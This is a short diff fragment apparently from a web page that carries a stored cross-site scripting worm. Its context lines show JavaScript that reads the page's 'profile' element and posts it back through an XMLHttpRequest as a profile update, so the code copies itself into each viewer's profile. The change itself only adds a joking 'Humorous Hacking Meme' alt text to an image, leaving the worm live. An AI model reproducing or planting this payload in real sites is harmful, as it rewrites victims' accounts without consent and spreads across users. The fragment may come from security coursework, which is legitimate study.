@@ -8,5 +8,5 @@ xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');
 var profile = document.getElementById('profile');
 xmlhttp.send(String.concat('profile_update=', profile.innerHTML, ampersand, 'profile_submit=Save'));
 total = 10;">
-<img src="http://i.imgur.com/r269A8J.png">
+<img src="http://i.imgur.com/r269A8J.png" alt="Humorous Hacking Meme">
 </span>
